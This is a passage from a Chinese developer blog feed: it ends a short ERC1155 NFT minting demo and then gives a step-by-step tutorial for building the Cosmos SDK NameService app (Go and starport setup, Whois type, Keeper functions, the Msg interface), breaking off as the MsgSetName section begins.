class_">Token</span>.<span class="title function_">uri</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;baseUri3:&quot;</span>, baseUri3.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">mint</span>(<span class="string">&quot;0xa48d2ed854effb7c4dafdb06931633699042c62a&quot;</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="string">&quot;0x&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> balance = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">balanceOf</span>(<span class="string">&quot;0xa48d2ed854effb7c4dafdb06931633699042c62a&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;balance:&quot;</span>, balance.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(error)</span><br><span class="line">    process.<span class="property">exitCode</span> = <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>先是给4个tokenId(0,1,2,3)分别设置不同的baseUri。</p>
<p>一般的ERC721协议的NFT,一个tokenId对应的数量只有一个。这里我们在调用铸造函数<code>mint(address account, uint256 id, uint256 amount, bytes memory data)</code>时，传参为<code>mint(&quot;0xa48d2ed854effb7c4dafdb06931633699042c62a&quot;, 0, 100, &quot;0x&quot;)</code>，给tokenId为0的NFT代币铸造100个。</p>
<h2 id="opensea查看">opensea查看:</h2>
<p>看看效果:<br />
<a href="https://testnets.opensea.io/zh-CN/collection/unidentified-contract-pkc1qecx1s">https://testnets.opensea.io/zh-CN/collection/unidentified-contract-pkc1qecx1s</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20230111144351.png" alt="20230111144351" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20230111144431.png" alt="20230111144431" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20230111144449.png" alt="20230111144449" /><br />
这样就实现了一个简单demo，一个项目方有4种NFT会员卡，每种会员卡NFT的数量有多个。</p>
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://opensea.io/collection/thirdweb-community">OpenSea thirdweb-community NFT</a>、<a href="https://polygonscan.com/address/0xa9e893cc12026a2f6bd826fdb295eac9c18a7e88#code">ERC1155合约源码参考</a></p>
</li>
<li class="lvl-2">
<p><a href="https://eips.ethereum.org/EIPS/eip-1155#metadata">EIP-1155：多代币标准</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/40_ERC1155/readme.md">WTF Solidity极简入门: 40. ERC1155</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.helloworld.net/p/1313614994">N合一代币合约ERC1151开发教程</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Cosmos官方NameService域名解析应用教程</title>
    <url>/2022/37691.html</url>
    <content><![CDATA[<h1>前言:</h1>
<p>找了一个旧版本的<code>cosmos-sdk</code>教程,目标是构建一个域名解析应用. 类似于Namecoin，ENS，Handshake这些模仿传统的DNS系统（<code>map[domain]zonefile</code>）的应用。用户可以购买未被使用的域名，或是出售/交易这些域名。</p>
<p>参考网址如下:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/weixin_43988498/article/details/114996094">cosmos官方nameservice测试项目详解（代码注释+官方文档错误纠正）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/docs/cosmos/tutorial/06-set-name.html#msg">Cosmos SDK 中文文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/547fc70b8335">cosmos-sdk-tutorials namechain 体验过程解析</a></p>
</li>
</ul>
<p>完整项目源码: <code>https://github.com/jerrychan807/cosmos-nameservice</code></p>
<h1>开发环境配置:</h1>
<h2 id="使用旧版的go">使用旧版的go:</h2>
<p>一开始使用1.18版本的go,在后面会报该错误<a href="https://github.com/cosmos/gravity-bridge/issues/320">panic: crypto/hmac: hash generation function does not produce unique values when using ebdcli keys to add account</a>,所以选择降级到<code>1.15.15</code>版本的go,就不会出现该错误了.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">wget https://golang.google.cn/dl/go1.15.15.linux-amd64.tar.gz</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -zxvf go1.15.15.linux-amd64.tar.gz -C /usr/</span><br><span class="line"><span class="comment"># 修改环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$GOROOT</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> GOPATH=/opt/go15</span><br><span class="line"><span class="built_in">export</span> PATH=$(go <span class="built_in">env</span> GOPATH)/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<p>通过修改环境变量的顺序,使得先读取到<code>1.15.15</code>版本的go</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]<span class="comment"># echo $PATH</span></span><br><span class="line">/opt/go15/bin:/usr/go/bin:/usr/go/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/local/go/bin:/opt/go/BIN:/opt/go/bin/:/opt/go/bin:/root/bin:/usr/go/bin:/opt/go15/bin:/usr/go/bin:/opt/go15/bin</span><br></pre></td></tr></table></figure>
<p>1.18版本go的环境变量,记录一下,方便后面恢复:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GOROOT=/usr/local/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin</span><br><span class="line"><span class="built_in">export</span> GOPATH=/opt/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>/BIN</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/opt/go/bin/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:$(go <span class="built_in">env</span> GOPATH)/bin</span><br></pre></td></tr></table></figure>
<h2 id="源码构建starport">源码构建starport:</h2>
<p><a href="https://github.com/ignite/cli/blob/v0.13.1/docs/1%20Introduction/2%20Install.md">starport v0.13.1官方安装readme</a></p>
<h3 id="下载源码">下载源码:</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载starport V0.13.1源码</span></span><br><span class="line">git <span class="built_in">clone</span> -b v0.13.1 https://github.com/ignite/cli.git</span><br><span class="line"><span class="built_in">cd</span> cli</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>报错,提示缺少<code>packr2</code>命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh: packr2: <span class="built_in">command</span> not found</span><br><span class="line">make: *** [build] Error 127</span><br></pre></td></tr></table></figure>
<h3 id="下载packr">下载packr:</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">wget https://github.com/gobuffalo/packr/releases/download/v2.8.1/packr_2.8.1_linux_amd64.tar.gz</span><br><span class="line"><span class="comment"># 解压缩</span></span><br><span class="line">tar -xf packr_2.8.1_linux_amd64.tar.gz</span><br><span class="line"><span class="comment"># 移动可执行文件</span></span><br><span class="line"><span class="built_in">mv</span> packr2 /usr/bin/packr2</span><br></pre></td></tr></table></figure>
<h3 id="再次编译">再次编译:</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 再次编译构建starport</span></span><br><span class="line">make</span><br><span class="line"><span class="comment"># 生成在build目录下</span></span><br><span class="line">[root@localhost build]<span class="comment"># pwd</span></span><br><span class="line">/blockchain/cli/build</span><br><span class="line"><span class="comment"># 确认版本</span></span><br><span class="line">[root@localhost build]<span class="comment"># ./starport version</span></span><br><span class="line">starport version v0.13.1 linux/amd64 -build <span class="built_in">date</span>: 2022-09-05T03:20:04</span><br><span class="line">git object <span class="built_in">hash</span>: b4e95f455cb9dfb35fcd9981786eb935cf9711c5</span><br><span class="line"><span class="comment"># 创建软连接</span></span><br><span class="line"><span class="built_in">ln</span> -s /blockchain/cli/build/starport /usr/bin/starport</span><br></pre></td></tr></table></figure>
<h1>程序目标:</h1>
<p>你正在构建的应用程序的目标是让用户购买域名并为其设置解析的值,给定域名的所有者将是当前最高出价者。</p>
<p>区块链应用程序只是一个<code>具有确定性的复制状态机</code>.<br />
状态机是一个计算机科学概念，其中一台机器可以有多个状态，但一次只能有一个状态。<br />
它遵循状态转换过程（或一组定义的过程），这是状态从旧状态或<code>初始状态 ( S) </code>更改为<code>新状态 ( S')</code>的唯一方式。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220907161249.png" alt="20220907161249" /><br />
作为开发人员，你只需定义<code>状态机（即状态，启动状态和触发状态转变的消息）</code>，<code>Tendermint</code> 将为你处理通过网络进行复制。</p>
<blockquote>
<p><code>Tendermint</code>是一个与应用程序无关的引擎，负责处理区块链的<code>网络层</code>和<code>共识层</code>。实际上，这意味着<code>Tendermint</code>负责传播和排序交易字节。<code>Tendermint Core</code>依赖于拜占庭容错（BFT）算法来达成交易顺序的共识</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220907160412.png" alt="20220907160412" /><br />
<code>Cosmos SDK</code>旨在帮助你构建状态机,构建应用层。<br />
SDK是一个<code>模块化框架</code>，意味着<code>应用程序</code>是通过将一组<code>可互操作的模块</code>集成在一起构建而成的。每个模块都包含自己的<code>消息/交易处理器</code>，而SDK负责将每条消息<code>路由</code>到其对应模块。</p>
<p>以下是nameservice应用程序所需的模块：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>auth</code> : 此模块定义了账户和手续费，并为你应用程序的其余部分提供了访问这些功能的权限。</p>
</li>
<li class="lvl-2">
<p><code>bank</code> : 此模块使得应用程序能够创建和管理token及余额。</p>
</li>
<li class="lvl-2">
<p><code>nameservice</code> : 需要我们自己写的nameservice应用的核心逻辑。</p>
</li>
</ul>
<p>现在，看一下应用程序的两个主要部分：<code>state（状态）</code> 和 <code>message（消息）</code>类型。</p>
<h2 id="State">State:</h2>
<p><code>state</code>反映了特定时刻你的应用程序。它告诉了每个帐户拥有多少token，每个域名的所有者和价格，以及每个域名的解析值。</p>
<p>token 和帐户的 state 由<code>auth</code>和<code>bank</code>模块定义，这意味着你现在不必关心它。你需要做的是定义与你的<code>nameservice</code>模块特定相关部分state。<br />
在 SDK 中，所有内容都存储在一个名为<code>multistore</code>的存储中。可以在此<code>multistore</code>中创建任意数量的键值对存储（在Cosmos SDK中称<code>作KVStore</code>）。<br />
在本应用中，我们将使用一个 store 记录 <code>name</code> 与 <code>whois</code> 信息，name 的 <code>value</code>、<code>owner</code> 和 <code>price</code> 将存储在一个结构中。</p>
<h2 id="Message">Message:</h2>
<p><code>message</code> 包含在 <code>transaction</code> 中。它们负责<code>触发state的转变</code>。<br />
每个模块定义了一个<code>message</code>列表及如何去处理它们。</p>
<p>下面这些 <code>message</code> 是你需要为你的 <code>nameservice</code> 应用去实现的：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>MsgSetName</code>: 此 message 允许域名的所有者为指定域名的<code>nameStore</code>设置一个值。</p>
</li>
<li class="lvl-2">
<p><code>MsgBuyName</code>: 此 message 允许账户去购买一个域名并在<code>ownerStore</code>中成为所有者。</p>
<ul class="lvl-2">
<li class="lvl-4">当有人购买一个域名时，他们需要支付比之前所有者购买价格更高的费用。</li>
<li class="lvl-4">如果域名还没有人购买，那么他们需要燃烧最小价格（MinPrice）的代币。</li>
</ul>
</li>
</ul>
<h2 id="交易的处理流程">交易的处理流程:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>当一条<code>交易</code>（包含在区块中）到达一个<code>Tendermint</code>节点时，它将通过 <code>ABCI</code> 传递给应用程序并被解码以得到 <code>message</code>。</p>
</li>
<li class="lvl-2">
<p>然后将<code>message</code>路由至对应的<code>模块module</code>，并根据定义在<code>Handler</code>中的逻辑来进行处理。</p>
</li>
<li class="lvl-2">
<p>如果 <code>state</code> 需要更新，<code>Handler</code>会调用<code>Keeper</code>来执行更新。</p>
</li>
</ul>
<h1>开始编写你的程序:</h1>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成脚手架</span></span><br><span class="line">starport app github.com/jerrychan807/cosmos-nameservice --sdk-version=<span class="string">&quot;launchpad&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">starport app github.com/jerrychan807/cosmos-nameservice --sdk-version=<span class="string">&quot;launchpad&quot;</span></span><br><span class="line"></span><br><span class="line">⭐️ Successfully created a Cosmos app <span class="string">&#x27;cosmos-nameservice&#x27;</span>.</span><br><span class="line">👉 Get started with the following commands:</span><br><span class="line"></span><br><span class="line"> % <span class="built_in">cd</span> cosmos-nameservice</span><br><span class="line"> % starport serve</span><br><span class="line"></span><br><span class="line">NOTE: add --verbose flag <span class="keyword">for</span> verbose (detailed) output.</span><br></pre></td></tr></table></figure>
<p>其中<code>app.go</code>,这个文件是<code>确定性状态机</code>的核心。</p>
<p>在<code>app.go</code>中，你定义了<strong>应用程序在接收交易时执行的操作</strong>。<br />
但首先，它要能够以正确的顺序接收交易。这是 <code>Tendermint共识引擎</code>的职责。<br />
<code>Tendermint</code> 通过名为 <code>ABCI</code> 的接口将交易从网络传递给应用程序。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220907181345.png" alt="20220907181345" /><br />
幸运的是，你不必实现ABCI接口。<code>Cosmos SDK</code>以<code>baseapp</code>的形式提供了区块链应用的雏形,我们只要基于<code>baseapp</code>定制化进行开发即可。<br />
baseapp做了以下几点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>解码从 <code>Tendermint共识引擎</code>接收到的<code>交易</code>。</p>
</li>
<li class="lvl-2">
<p>从交易中提取 <code>messages</code> 并做基本的合理性校验。</p>
</li>
<li class="lvl-2">
<p>将这些 message <code>路由</code>到合适的模块使其被正确处理。</p>
</li>
<li class="lvl-2">
<p>如果 ABCI 消息是<code>DeliverTx（CheckTx）</code>的话就<code>Commit</code>。</p>
</li>
<li class="lvl-2">
<p>帮助设置<code>BeginBlock</code>和<code>EndBlock</code>,这两种消息让你能定义在每个区块开始和结束时执行的逻辑。</p>
</li>
<li class="lvl-2">
<p>帮助初始化你的 <code>state</code>。</p>
</li>
<li class="lvl-2">
<p>帮助设置 <code>queries</code>。</p>
</li>
</ul>
<p><code>baseapp</code>不能够识别用户自定义模块的路由和应用程序中自定义的用户接口,我们需要将我们的<code>cosmosnameservicetypes</code>类型将嵌入到<code>baseapp</code>中。</p>
<blockquote>
<p>需要修改 <a href="https://github.com/jerrychan807/cosmos-nameservice/blob/main/app/app.go">app.go</a></p>
</blockquote>
<blockquote>
<p>为了完成应用程序,你需要引入一些模块.继续开始构建你的域名服务模块.稍后会回到<code>app.go</code>.</p>
</blockquote>
<h1>类型Types:</h1>
<p>我们要做的第一件事是定义一个结构，包含域名所有元数据。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># starport创建whois类型</span></span><br><span class="line">starport <span class="built_in">type</span> whois value price</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost cosmos-nameservice]<span class="comment"># starport type whois value price</span></span><br><span class="line"></span><br><span class="line">🎉 Created a <span class="built_in">type</span> `whois`.</span><br></pre></td></tr></table></figure>
<p>每个域名有以下相关的数据：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Value</code>: 域名解析出为的值</p>
</li>
<li class="lvl-2">
<p><code>Creator</code>: 该域名当前所有者的地址</p>
</li>
<li class="lvl-2">
<p><code>Price</code>: 你需要为购买域名支付的费用</p>
</li>
</ul>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Whois <span class="keyword">struct</span> &#123;</span><br><span class="line">	Creator sdk.AccAddress <span class="string">`json:&quot;creator&quot; yaml:&quot;creator&quot;`</span></span><br><span class="line">	ID      <span class="type">string</span>         <span class="string">`json:&quot;id&quot; yaml:&quot;id&quot;`</span></span><br><span class="line">	Value   <span class="type">string</span>         <span class="string">`json:&quot;value&quot; yaml:&quot;value&quot;`</span></span><br><span class="line">	Price   sdk.Coins      <span class="string">`json:&quot;price&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/types/TypeWhois.go</code></p>
</blockquote>
<h1>Keeper:</h1>
<p><code>Cosmos SDK</code>模块的主要核心是名为<code>Keeper</code>的部分。<br />
它处理<code>存储的交互</code>，引用其他的keeper进行<code>跨模块的交互</code>，并包含模块的大部分核心功能。</p>
<h2 id="Keeper结构">Keeper结构:</h2>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> keeper</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/tendermint/tendermint/libs/log&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/codec&quot;</span></span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/cosmos/cosmos-sdk/x/bank&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/cosmos-nameservice/x/cosmosnameservice/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keeper of the cosmosnameservice store</span></span><br><span class="line"><span class="comment">// Keeper结构体</span></span><br><span class="line"><span class="keyword">type</span> Keeper <span class="keyword">struct</span> &#123;</span><br><span class="line">	CoinKeeper bank.Keeper  <span class="comment">// bank模块, 底层管理token的模块</span></span><br><span class="line">	storeKey   sdk.StoreKey <span class="comment">// cosmos-sdk/types的通用存储key类型</span></span><br><span class="line">	cdc        *codec.Codec <span class="comment">// 底层编码模块</span></span><br><span class="line">	<span class="comment">// paramspace types.ParamSubspace</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要修改<a href="https://github.com/jerrychan807/cosmos-nameservice/blob/main/x/cosmosnameservice/keeper/keeper.go">x/cosmosnameservice/keeper/keeper.go</a></p>
</blockquote>
<p>关于上述代码的几点说明：</p>
<p>3个不同的<code>cosmos-sdk</code>包被引入：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>codec</code>: 提供负责Cosmos编码格式的工具——Amino。</p>
</li>
<li class="lvl-2">
<p><code>bank</code>: 控制账户和转账。</p>
</li>
<li class="lvl-2">
<p><code>types</code>: 包含了整个SDK常用的类型。</p>
</li>
</ul>
<p>Keeper结构体。在 keeper 中有几个关键部分：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>bank.Keeper</code>: 这是bank模块的Keeper引用。包括它来允许该模块中的代码调用bank模块的函数。</p>
<ul class="lvl-2">
<li class="lvl-6">SDK使用<code>对象能力</code>来访问应用程序状态的各个部分。这是为了允许开发人员采用小权限准入原则，限制错误或恶意模块的去影响其不需要访问的状态的能力。</li>
</ul>
</li>
<li class="lvl-2">
<p><code>*codec.Codec</code>: 这是被<code>Amino</code>用于编码及解码的指针。</p>
</li>
<li class="lvl-2">
<p><code>sdk.StoreKey</code>: 通过它来访问一个持久化保存你的应用程序状态的<code>sdk.KVStore</code>。</p>
</li>
</ul>
<p>模块有1个StoreKey:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>storeKey</code>: 这是 name 指向（如 <code>map[name]Whois</code>）Whois 结构的主存储空间</p>
</li>
</ul>
<h2 id="Getter-和-Setter">Getter 和 Setter:</h2>
<p>现在要添加通过<code>Keeper</code>来与存储交互的方法了。<br />
首先，添加一个函数来为指定域名设置解析字符串值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SetWhois sets a whois. We modified this function to use the `name` value as the key instead of msg.ID</span></span><br><span class="line"><span class="comment">// 存储Whois,我们修改这个函数,使用&#x27;name&#x27;值作为键,而不是msg.ID</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> SetWhois(ctx sdk.Context, name <span class="type">string</span>, whois types.Whois) &#123;</span><br><span class="line">	store := ctx.KVStore(k.storeKey)</span><br><span class="line">	<span class="comment">// 使用cdc编码参数whois结构体返回的bz是byte切片</span></span><br><span class="line">	<span class="comment">// MustMarshalBinaryLengthPrefixed 有Must代表不返回其错误直接Panic处理,即使有err的话，没有的话返回可能的错误</span></span><br><span class="line">	bz := k.cdc.MustMarshalBinaryLengthPrefixed(whois)</span><br><span class="line">	<span class="comment">// 使用&#x27;name&#x27;值作为键,而不是msg.ID</span></span><br><span class="line">	key := []<span class="type">byte</span>(types.WhoisPrefix + name)</span><br><span class="line">	<span class="comment">// 存储</span></span><br><span class="line">	store.Set(key, bz)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查找域名对应的解析值函数:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// GetWhois returns the whois information</span></span><br><span class="line"><span class="comment">// 获取whois结构体数据, key就是域名的name</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> GetWhois(ctx sdk.Context, key <span class="type">string</span>) (types.Whois, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// 1. 使用StoreKey访问存储,获取namservice数据库</span></span><br><span class="line">	store := ctx.KVStore(k.storeKey)</span><br><span class="line">	<span class="keyword">var</span> whois types.Whois</span><br><span class="line">	<span class="comment">// 2. 拼接key, whois前缀 + 获取参数key</span></span><br><span class="line">	byteKey := []<span class="type">byte</span>(types.WhoisPrefix + key)</span><br><span class="line">	<span class="comment">// 3. 使用keeper的codec类型cdc解码, 赋值给whois结构体</span></span><br><span class="line">	err := k.cdc.UnmarshalBinaryLengthPrefixed(store.Get(byteKey), &amp;whois)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> whois, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 4. 返回</span></span><br><span class="line">	<span class="keyword">return</span> whois, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要修改<code>x/cosmosnameservice/keeper/whois.go</code></p>
</blockquote>
<h2 id="其他函数">其他函数:</h2>
<p>继续添加其他函数:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取whois的所有数量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> GetWhoisCount()</span><br><span class="line"><span class="comment">// 存储whois的总数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> SetWhoisCount()</span><br><span class="line"><span class="comment">// 删除一个whois结构体</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> DeleteWhois()</span><br><span class="line"><span class="comment">// 获取域名的创建者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> GetCreator()</span><br><span class="line"><span class="comment">// 检查当前域名key/name是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> Exists()</span><br><span class="line"><span class="comment">// 获取域名的解析值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> ResolveName()</span><br><span class="line"><span class="comment">// 设置域名对应的解析值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> SetName()</span><br><span class="line"><span class="comment">// 检查当前域名是否有创建人</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> HasCreator()</span><br><span class="line"><span class="comment">// 设置域名的当前拥有者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> SetCreator()</span><br><span class="line"><span class="comment">// 获取域名的价格</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> GetPrice()</span><br><span class="line"><span class="comment">// 设置域名的价格</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> SetPrice()</span><br><span class="line"><span class="comment">// 检查当前的name参数是否存在于store中，注意于Exists函数的区别：没有加前缀</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> IsNamePresent()</span><br><span class="line"><span class="comment">// 获取固定前缀的迭代器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> GetNamesIterator()</span><br><span class="line"><span class="comment">// 根据key = id获取whois的创建者， 但是可能会返回err</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> GetWhoisOwner()</span><br><span class="line"><span class="comment">// 根绝key查询是否存在， key是域名结构体中的id</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(k Keeper)</span></span> WhoisExists()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>接下来,该描述如何让用户通过<code>Msgs</code>和<code>Handlers</code>与刚刚建立的<code>store</code>交互。</p>
</blockquote>
<h1>Msg 和 Handler:</h1>
<p>现在你已经设置了<code>Keeper</code>，是时候构建允许用户购买域名和设置解析值的<code>Msg</code>和<code>Handler</code>了。</p>
<h2 id="Msg">Msg:</h2>
<p><code>Msg</code>触发状态转变。<code>Msgs</code>被包裹在客户端提交至网络的<code>Txs</code>中。<br />
Cosmos SDK从<code>Txs</code>中打包和解包<code>Msgs</code>，这就意味着，作为一个应用开发者，你只需要去定义<code>Msgs</code>。<br />
Msg必须要满足以下接口:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	sdk <span class="string">&quot;github.com/cosmos/cosmos-sdk/types&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Transactions messages must fulfill the Msg</span></span><br><span class="line"><span class="comment">// 实现接口必须实现所有的函数</span></span><br><span class="line"><span class="keyword">type</span> Msg <span class="keyword">interface</span> &#123;</span><br><span class="line">	<span class="comment">// Return the message type.</span></span><br><span class="line">	<span class="comment">// Must be alphanumeric or empty.</span></span><br><span class="line">	<span class="comment">// 返回消息类型， 必须是字母或者空</span></span><br><span class="line">	Type() <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Returns a human-readable string for the message, intended for utilization</span></span><br><span class="line">	<span class="comment">// within tags</span></span><br><span class="line">	<span class="comment">// 返回消息的可读string,用于在标签中使用</span></span><br><span class="line">	Route() <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// ValidateBasic does a simple validation check that</span></span><br><span class="line">	<span class="comment">// doesn&#x27;t require access to any other information.</span></span><br><span class="line">	<span class="comment">// 做一些基本的验证, 不需要访问其他信息</span></span><br><span class="line">	ValidateBasic() <span class="type">error</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get the canonical byte representation of the Msg.</span></span><br><span class="line">	<span class="comment">// 获取Msg的规范字节表示即字节数组</span></span><br><span class="line">	GetSignBytes() []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Signers returns the addrs of signers that must sign.</span></span><br><span class="line">	<span class="comment">// CONTRACT: All signatures must be present to be valid.</span></span><br><span class="line">	<span class="comment">// CONTRACT: Returns addrs in some deterministic order.</span></span><br><span class="line">	<span class="comment">// 返回必须签名的签名者地址集合， 所有的签名必须在当下还有效， 返回的签名集合会以某种确定的顺序</span></span><br><span class="line">	GetSigners() []sdk.AccAddress</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要修改<code>./x/cosmosnameservice/types/msg.go</code></p>
</blockquote>
<h2 id="Handler">Handler:</h2>
<p><code>Handler</code>定义了在接收到一个特定<code>Msg</code>时，需要采取的操作（哪些存储需要更新，怎样更新及要满足什么条件），可看作为<code>controller</code>。<br />
在此模块中，你有两种类型的<code>Msg</code>，用户可以发送这些<code>Msg</code>来和应用程序状态进行交互：<code>SetName</code>和<code>BuyName</code>。它们各自同其<code>Handler</code>关联。</p>
<blockquote>
<p>现在你已经更好地理解了 <code>Msgs</code>和<code>Handler</code>，可以开始构建你的第一条消息：<code>SetName</code>。</p>
</blockquote>
<h1>MsgSetName:</h1>
<p>SDK中Msg的命令约束是 <code>Msg&#123;.Action&#125;</code>。要实现的第一个操作是<code>SetName</code>，因此命名为<code>MsgSetName</code>。<br />
首先实现<code>SetName</code>, 这个消息Msg允许域名的所有者在解析器中设置该域名的返回值。</p>
<blockquote>
